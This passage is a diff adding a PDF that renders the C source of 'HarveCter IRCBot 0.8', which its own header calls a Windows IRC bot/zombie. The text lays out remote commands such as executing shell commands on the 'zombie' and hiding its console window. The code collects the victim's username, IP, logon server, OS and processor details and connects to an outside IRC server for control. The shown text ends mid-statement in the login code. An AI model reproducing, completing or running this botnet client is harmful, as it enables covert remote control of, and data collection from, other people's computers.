@@ -1,0 +1,2560 @@
+%PDF-1.3
+%«Ïè¢
+1 0 obj
+<</Type/Font/Subtype/Type1/Name/F1/BaseFont/Helvetica/Encoding/WinAnsiEncoding>>
+endobj
+2 0 obj
+<</Type/Font/Subtype/Type1/Name/F2/BaseFont/Helvetica-Bold/Encoding/WinAnsiEncoding>>
+endobj
+3 0 obj
+<</Type/Font/Subtype/Type1/Name/F3/BaseFont/Helvetica-Oblique/Encoding/WinAnsiEncoding>>
+endobj
+4 0 obj
+<</Type/Font/Subtype/Type1/Name/F4/BaseFont/Helvetica-BoldOblique/Encoding/WinAnsiEncoding>>
+endobj
+5 0 obj
+<</Length 3503>>
+stream
+BT 1 0 0 1 72 762 Tm
+/F1 10 Tf 0 0 0 rg 0 0.498 0 rg (/*)Tj
+0 -12.0 TD
+(HarveCter IRCBot 0.8)Tj
+T*
+(This 31337 code by: Harvie 2oo7)Tj
+T*
+(Windows IRC Bot/Zombie/Whatever you want...)Tj
+T*
+T*
+(INFO:)Tj
+T*
+(Optimalized for Dev-Cpp)Tj
+T*
+(Compile as window app to make a daemon)Tj
+T*
+T*
+(Warning:)Tj
+T*
+(There is not so big security!!!)Tj
+T*
+(If you want to keep your zombies,)Tj
+T*
+(control them only by PM or at completely secure channel!!!)Tj
+T*
+(All passwords, that are starting with your password will be accepted!!!)Tj
+T*
+T*
+(COMMANDS:)Tj
+T*
+(Warning: all commands are case sensitive)Tj
+T*
+T*
+(!login [login]          //Bad login=logout)Tj
+T*
+(!chanpass               //Set mode +k)Tj
+T*
+T*
+(PRIVILEGED COMMANDS:)Tj
+T*
+(!SAY [msg]              //Say msg)Tj
+T*
+(!CMD [shell command]    //Execute command @ zombie)Tj
+T*
+(!raw [line to send]     //Sends raw line to server \(you can OP yourself\))Tj
+T*
+(!info                   //Info about zombie)Tj
+T*
+(!time                   //Localtime @ zombie)Tj
+T*
+(!show                   //Show console window)Tj
+T*
+(!hide                   //Hide console window)Tj
+T*
+(!restart                //Restart connection)Tj
+T*
+T*
+(Comments:)Tj
+T*
+(6 * 128 == 768 == Maximum lenght of IRC message \(RFC\))Tj
+T*
+(*/)Tj
+T*
+T*
+(//Preproc:)Tj
+T*
+0.498 0.498 0 rg (#include <stdio.h>)Tj
+T*
+(#include <time.h>)Tj
+T*
+(#include <stdlib.h>)Tj
+T*
+(#include <winsock.h>)Tj
+T*
+(#include <windows.h>)Tj
+T*
+(#pragma comment\(lib,"ws2_32.a"\);)Tj
+T*
+T*
+0 0.498 0 rg (//Sends IRC message "msg" to "channel" over socket "s".       )Tj
+T*
+/F2 10 Tf 0 0 0.498 rg (int)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (irc_sendmsg)Tj
+/F2 10 Tf (\()Tj
+0 0 0.498 rg (int)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+0 0 0.498 rg (char)Tj
+( )Tj
+0 0 0 rg (*)Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+0 0 0.498 rg (char)Tj
+( )Tj
+0 0 0 rg (*)Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\))Tj
+( )Tj
+({)Tj
+T*
+(    )Tj
+0 0 0.498 rg (int)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (err)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (snd)Tj
+/F2 10 Tf ([)Tj
+/F1 10 Tf 0 0.498 0.498 rg (1024)Tj
+/F2 10 Tf 0 0 0 rg (];)Tj
+T*
+(    )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg (": PRIVMSG %s :%s\\n")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (len)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (strlen)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (send)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//printf\("%s", snd\); //Show)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (return)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (err)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+(})Tj
+T*
+T*
+/F1 10 Tf 0 0.498 0 rg (//Main:       )Tj
+T*
+(//int main\(int argc, char *argv[]\) {)Tj
+T*
+/F2 10 Tf 0 0 0.498 rg (int)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (WINAPI)Tj
+( )Tj
+(WinMain)Tj
+( )Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (HINSTANCE)Tj
+( )Tj
+(instance)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (HINSTANCE)Tj
+( )Tj
+(previous)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (LPSTR)Tj
+( )Tj
+(commandline)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+0 0 0.498 rg (int)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (show)Tj
+/F2 10 Tf (\))Tj
+( )Tj
+({)Tj
+T*
+(    )Tj
+ET
+endstream
+endobj
+6 0 obj
+<</Length 7927>>
+stream
+BT 1 0 0 1 72 762 Tm
+/F2 10 Tf 0 0 0 rg (    )Tj
+0 -12.0 TD
+/F1 10 Tf 0 0.498 0 rg (//SETTINGS: //////////////////////////////////////////////////////////////)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (server)Tj
+/F2 10 Tf ([])Tj
+( )Tj
+(=)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("irc.2600.net")Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//IRC Server)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (int)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (port)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (6667)Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Port of IRC Server)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (channel)Tj
+/F2 10 Tf ([])Tj
+( )Tj
+(=)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("#hv")Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//IRC Channel)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (nick)Tj
+/F2 10 Tf ([)Tj
+/F1 10 Tf 0 0.498 0.498 rg (128)Tj
+/F2 10 Tf 0 0 0 rg (])Tj
+( )Tj
+(=)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("Harvecter")Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Username of active user will be used instead)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (pass)Tj
+/F2 10 Tf ([])Tj
+( )Tj
+(=)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("test")Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Bot Password)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (chanpass)Tj
+/F2 10 Tf ([])Tj
+( )Tj
+(=)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("lol")Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Channel Password)Tj
+T*
+(//MISC:///////////////////////////////////////////////////////////////////)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (cmdfile)Tj
+/F2 10 Tf ([])Tj
+( )Tj
+(=)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("commands.bat")Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+T*
+(    )Tj
+/F1 10 Tf (FILE)Tj
+( )Tj
+/F2 10 Tf (*)Tj
+/F1 10 Tf (cmdf)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (version)Tj
+/F2 10 Tf ([])Tj
+( )Tj
+(=)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("0.8")Tj
+/F2 10 Tf 0 0 0 rg (;)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Bot version)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (lclhost)Tj
+/F2 10 Tf ([)Tj
+/F1 10 Tf 0 0.498 0.498 rg (256)Tj
+/F2 10 Tf 0 0 0 rg (],)Tj
+( )Tj
+/F1 10 Tf (lclhostnm)Tj
+/F2 10 Tf ([)Tj
+/F1 10 Tf 0 0.498 0.498 rg (256)Tj
+/F2 10 Tf 0 0 0 rg (],)Tj
+( )Tj
+/F1 10 Tf (hostmsg)Tj
+/F2 10 Tf ([)Tj
+/F1 10 Tf 0 0.498 0.498 rg (1000)Tj
+/F2 10 Tf 0 0 0 rg (];)Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//AllocConsole\(\); //Ukazat)Tj
+T*
+(    )Tj
+(//FreeConsole\(\); //Schovat... ;\))Tj
+T*
+(    )Tj
+(//freopen\("log.txt", "ab", stdout\);)Tj
+T*
+(//////////////////////////////////////////////////////////////////////////)Tj
+T*
+(    )Tj
+T*
+(//CODE:)Tj
+T*
+(    )Tj
+0 0 0 rg (srand)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (time)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\)\);)Tj
+T*
+(    )Tj
+0 0 0.498 rg (char)Tj
+( )Tj
+0 0 0 rg (*)Tj
+/F1 10 Tf (user)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+(*)Tj
+/F1 10 Tf (processor)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+(*)Tj
+/F1 10 Tf (root)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+(*)Tj
+/F1 10 Tf (logonsrvr)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+(*)Tj
+/F1 10 Tf (os)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (rnd)Tj
+/F2 10 Tf ([)Tj
+/F1 10 Tf 0 0.498 0.498 rg (10)Tj
+/F2 10 Tf 0 0 0 rg (];)Tj
+T*
+(    )Tj
+0 0 0.498 rg (struct)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (tm)Tj
+( )Tj
+/F2 10 Tf (*)Tj
+/F1 10 Tf (localtime)Tj
+/F2 10 Tf (\()Tj
+0 0 0.498 rg (const)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (time_t)Tj
+( )Tj
+/F2 10 Tf (*)Tj
+/F1 10 Tf (tod)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (user)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (getenv)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("USERNAME")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (processor)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (getenv)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("PROCESSOR_IDENTIFIER")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (root)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (getenv)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("SystemRoot")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (logonsrvr)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (getenv)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("LOGONSERVER")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (os)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (getenv)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("OS")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (rnd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("%i")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (rand)Tj
+/F2 10 Tf (\(\)\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (nick)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("H-%s-%s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (user)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (rnd)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//time)Tj
+T*
+(    )Tj
+0 0 0 rg (time_t)Tj
+( )Tj
+(cas)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+0 0 0.498 rg (struct)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (tm)Tj
+( )Tj
+/F2 10 Tf (*)Tj
+/F1 10 Tf (p_st_cas)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//CMD)Tj
+T*
+(    )Tj
+0 0 0 rg (FILE)Tj
+( )Tj
+/F2 10 Tf (*)Tj
+/F1 10 Tf (p_proc)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (procc)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+T*
+(    )Tj
+T*
+(    )Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//Intro)Tj
+T*
+(    )Tj
+0 0 0 rg (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("HarveCter IRCBot v%s\\nConnecting: %s@%s:%i as %s\\n")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (version)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (channel)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (server)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (port)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (nick)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//system\("pause"\);)Tj
+T*
+(    )Tj
+T*
+(    )Tj
+(//Deklarace pro WSA)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (int)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (s)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+/F1 10 Tf (SOCKADDR_IN)Tj
+( )Tj
+(sck)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+/F1 10 Tf (HOSTENT)Tj
+( )Tj
+/F2 10 Tf (*)Tj
+/F1 10 Tf (host)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+(*)Tj
+/F1 10 Tf (localhost)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+/F1 10 Tf (WSADATA)Tj
+( )Tj
+(wsadata)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+/F1 10 Tf (WSAStartup)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (MAKEWORD)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (1)Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+/F1 10 Tf 0 0.498 0.498 rg (1)Tj
+/F2 10 Tf 0 0 0 rg (\),&)Tj
+/F1 10 Tf (wsadata)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//Data pro WSA)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (while)Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+/F1 10 Tf (host)Tj
+/F2 10 Tf (=)Tj
+/F1 10 Tf (gethostbyname)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (server)Tj
+/F2 10 Tf (\)\))Tj
+( )Tj
+(==)Tj
+( )Tj
+/F1 10 Tf (NULL)Tj
+/F2 10 Tf (\){)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Host)Tj
+T*
+(        )Tj
+0 0 0 rg (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("!Error server host not found\\nwaiting 5s...\\n")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(        )Tj
+/F1 10 Tf (sleep)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (5000)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+(                                 )Tj
+T*
+(    )Tj
+(})Tj
+T*
+(    )Tj
+/F1 10 Tf (sck)Tj
+/F2 10 Tf (.)Tj
+/F1 10 Tf (sin_family)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (PF_INET)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+/F1 10 Tf (memcpy)Tj
+/F2 10 Tf (\(&)Tj
+/F1 10 Tf (sck)Tj
+/F2 10 Tf (.)Tj
+/F1 10 Tf (sin_addr)Tj
+/F2 10 Tf (.)Tj
+/F1 10 Tf (s_addr)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (host)Tj
+/F2 10 Tf (->)Tj
+/F1 10 Tf (h_addr)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (host)Tj
+/F2 10 Tf (->)Tj
+/F1 10 Tf (h_length)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (sck)Tj
+/F2 10 Tf (.)Tj
+/F1 10 Tf (sin_port)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (htons)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (port)Tj
+/F2 10 Tf (\);)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Port)Tj
+T*
+(    )Tj
+ET
+endstream
+endobj
+7 0 obj
+<</Length 9754>>
+stream
+BT 1 0 0 1 72 762 Tm
+/F1 10 Tf 0 0.498 0 rg (    )Tj
+(//Localhost Info)Tj
+0 -12.0 TD
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (while)Tj
+( )Tj
+0 0 0 rg (\(\()Tj
+/F1 10 Tf (localhost)Tj
+/F2 10 Tf (=)Tj
+/F1 10 Tf (gethostbyname)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("")Tj
+/F2 10 Tf 0 0 0 rg (\)\))Tj
+( )Tj
+(==)Tj
+( )Tj
+/F1 10 Tf (NULL)Tj
+/F2 10 Tf (\))Tj
+( )Tj
+({)Tj
+T*
+(        )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("!Error local host not found\\nwaiting 5s...\\n")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(        )Tj
+/F1 10 Tf (sleep)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (5000)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+(  )Tj
+T*
+(        )Tj
+(})Tj
+T*
+(        )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (lclhostnm)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("%s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (localhost)Tj
+/F2 10 Tf (->)Tj
+/F1 10 Tf (h_name)Tj
+/F2 10 Tf (\);)Tj
+T*
+(        )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (lclhost)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("%s")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (inet_ntoa)Tj
+/F2 10 Tf (\(*\(\()Tj
+0 0 0.498 rg (struct)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (in_addr)Tj
+( )Tj
+/F2 10 Tf (*\))Tj
+/F1 10 Tf (localhost)Tj
+/F2 10 Tf (->)Tj
+/F1 10 Tf (h_addr)Tj
+/F2 10 Tf (\)\)\);)Tj
+T*
+(        )Tj
+/F1 10 Tf (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (hostmsg)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("USER: %s at HOST: %s \( IP: %s \) SERVER: %s - OS: %s \(%s\) - ARCH: %s\\n")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (user)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (lclhostnm)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (lclhost)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (logonsrvr)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (os)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (root)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (processor)Tj
+/F2 10 Tf (\);)Tj
+T*
+(        )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("%s\\n")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (hostmsg)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//Init)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (int)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (len)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (err)Tj
+/F2 10 Tf (;)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0 rg (//Lenght, Error)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (char)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (snd)Tj
+/F2 10 Tf ([)Tj
+/F1 10 Tf 0 0.498 0.498 rg (1024)Tj
+/F2 10 Tf 0 0 0 rg (],)Tj
+( )Tj
+/F1 10 Tf (msg)Tj
+/F2 10 Tf ([)Tj
+/F1 10 Tf 0 0.498 0.498 rg (1000)Tj
+/F2 10 Tf 0 0 0 rg (],)Tj
+( )Tj
+/F1 10 Tf (rcv)Tj
+/F2 10 Tf ([)Tj
+/F1 10 Tf 0 0.498 0.498 rg (1024)Tj
+/F2 10 Tf 0 0 0 rg (],)Tj
+( )Tj
+/F1 10 Tf (passin)Tj
+/F2 10 Tf ([)Tj
+/F1 10 Tf 0 0.498 0.498 rg (1000)Tj
+/F2 10 Tf 0 0 0 rg (],)Tj
+( )Tj
+(*)Tj
+/F1 10 Tf (sub)Tj
+/F2 10 Tf (;)Tj
+T*
+(    )Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//Infinite Loop)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (while)Tj
+0 0 0 rg (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (1)Tj
+/F2 10 Tf 0 0 0 rg (\))Tj
+( )Tj
+({)Tj
+T*
+(    )Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//Vytvorit socket)Tj
+T*
+(    )Tj
+0 0 0 rg (s)Tj
+/F2 10 Tf (=)Tj
+/F1 10 Tf (socket)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (AF_INET)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (SOCK_STREAM)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0 0.498 0.498 rg (0)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(    )Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//Pripojit)Tj
+T*
+(    )Tj
+/F2 10 Tf 0 0 0.498 rg (while)Tj
+0 0 0 rg (\()Tj
+( )Tj
+(\()Tj
+( )Tj
+/F1 10 Tf (connect)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+(\()Tj
+0 0 0.498 rg (struct)Tj
+( )Tj
+/F1 10 Tf 0 0 0 rg (sockaddr)Tj
+( )Tj
+/F2 10 Tf (*\)&)Tj
+/F1 10 Tf (sck)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+0 0 0.498 rg (sizeof)Tj
+0 0 0 rg (\()Tj
+/F1 10 Tf (sck)Tj
+/F2 10 Tf (\)\))Tj
+( )Tj
+(\))Tj
+( )Tj
+(\))Tj
+( )Tj
+({)Tj
+T*
+(        )Tj
+/F1 10 Tf (printf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0.498 0 0.498 rg ("!Error while connecting\\nwaiting 5s...\\n")Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(        )Tj
+/F1 10 Tf (sleep)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf 0 0.498 0.498 rg (5000)Tj
+/F2 10 Tf 0 0 0 rg (\);)Tj
+T*
+(        )Tj
+(})Tj
+(   )Tj
+T*
+(    )Tj
+T*
+(    )Tj
+/F1 10 Tf 0 0.498 0 rg (//Prihlasit)Tj
+T*
+(    )Tj
+0 0 0 rg (sprintf)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf 0.498 0 0.498 rg ("USER USER %s # # :%s\\nNICK %s\\nJOIN %s\\n")Tj
+/F2 10 Tf 0 0 0 rg (,)Tj
+( )Tj
+/F1 10 Tf (nick)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (nick)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (nick)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (len)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (strlen)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (snd)Tj
+/F2 10 Tf (\);)Tj
+T*
+(    )Tj
+/F1 10 Tf (err)Tj
+( )Tj
+/F2 10 Tf (=)Tj
+( )Tj
+/F1 10 Tf (send)Tj
+/F2 10 Tf (\()Tj
+/F1 10 Tf (s)Tj
+/F2 10 Tf (,)Tj
+( )Tj
+/F1 10 Tf (snd)Tj
